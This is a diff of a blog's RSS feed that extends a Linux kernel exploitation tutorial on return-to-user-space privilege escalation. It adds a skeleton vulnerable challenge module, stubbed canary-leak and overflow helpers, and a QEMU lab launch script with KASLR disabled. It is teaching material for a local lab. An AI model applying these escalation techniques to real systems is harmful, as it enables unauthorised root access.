@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Putting it All Together User-space vs. Kernel-space &amp;hellip;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Putting it All Together User-space vs. Kernel-space &amp;hellip;
 Return to User-space Overview &amp;hellip;
 Saving the Initial State &amp;hellip;
 unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* save user-space */ __asm__( &amp;#34;.intel_syntax noprefix;&amp;#34; &amp;#34;mov save_ss, ss;&amp;#34; &amp;#34;mov save_sp, rsp;&amp;#34; &amp;#34;pushf;&amp;#34; &amp;#34;pop save_rf;&amp;#34; &amp;#34;mov save_cs, cs;&amp;#34; &amp;#34;.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
@@ -9,6 +9,8 @@ unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* sa
 &lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#putting-it-all-together">Putting it All Together&lt;/a>&lt;/li>
 &lt;/ol>
 &lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
@@ -81,6 +83,69 @@ load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/s
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
+&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/challenge.c">challenge.c&lt;/a>&lt;/p>
+&lt;div class="collapsable-code">
+&lt;input id="1" type="checkbox" checked />
+&lt;label for="1">
+&lt;span class="collapsable-code__language">c&lt;/span>
+&lt;span class="collapsable-code__title">challenge.c&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-c" >&lt;code>
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/fs.h&amp;gt;
+#include &amp;lt;linux/proc_fs.h&amp;gt;
+#include &amp;lt;linux/uaccess.h&amp;gt;
+MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
+struct proc_dir_entry *proc_entry;
+static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
+{
+// vulnerable read function
+}
+static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
+{
+// vulnerable write function
+}
+static int challenge_open(struct inode *inode, struct file *fp)
+{
+return 0;
+}
+static int challenge_release(struct inode *inode, struct file *fp)
+{
+return 0;
+}
+static struct file_operations fops = {
+.read = challenge_read,
+.write = challenge_write,
+.open = challenge_open,
+.release = challenge_release
+};
+int init_module(void)
+{
+proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
+return 0;
+}
+void cleanup_module(void)
+{
+if (proc_entry) {
+proc_remove(proc_entry);
+}
+}
+&lt;/code>&lt;/pre>
+&lt;/div>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
+{
+&lt;span style="color:#75715e">// vulnerable read function
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
+{
+&lt;span style="color:#75715e">// vulnerable write function
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
 {
 &lt;span style="color:#75715e">// ...
@@ -90,7 +155,40 @@ load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/s
 {
 &lt;span style="color:#75715e">// ...
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="putting-it-all-together">Putting it All Together&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="collapsable-code">
+&lt;input id="2" type="checkbox" />
+&lt;label for="2">
+&lt;span class="collapsable-code__language">sh&lt;/span>
+&lt;span class="collapsable-code__title">launch.sh&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-sh" >&lt;code>
+#!/bin/bash
+# build root fs
+pushd fs
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
+popd
+# launch
+/usr/bin/qemu-system-x86_64 \
+-kernel linux-5.4/arch/x86/boot/bzImage \
+-initrd $PWD/initramfs.cpio.gz \
+-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
+-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
+-nographic \
+-monitor none \
+-s \
+-append &amp;#34;console=ttyS0 nokaslr quiet&amp;#34;
+&lt;/code>&lt;/pre>
+&lt;/div>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
+...
+~/pwnkernel $ ./launch.sh
+/ # id
+uid=0(root) gid=0
+&lt;/code>&lt;/pre>&lt;h2 id="putting-it-all-together">Putting it All Together&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
 {
@@ -111,8 +209,8 @@ overflow_buffer(fd, canary);
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
 &lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
-&lt;input id="6" type="checkbox" checked />
-&lt;label for="6">
+&lt;input id="3" type="checkbox" checked />
+&lt;label for="3">
 &lt;span class="collapsable-code__language">c&lt;/span>
 &lt;span class="collapsable-code__title">exploit.c&lt;/span>
 &lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
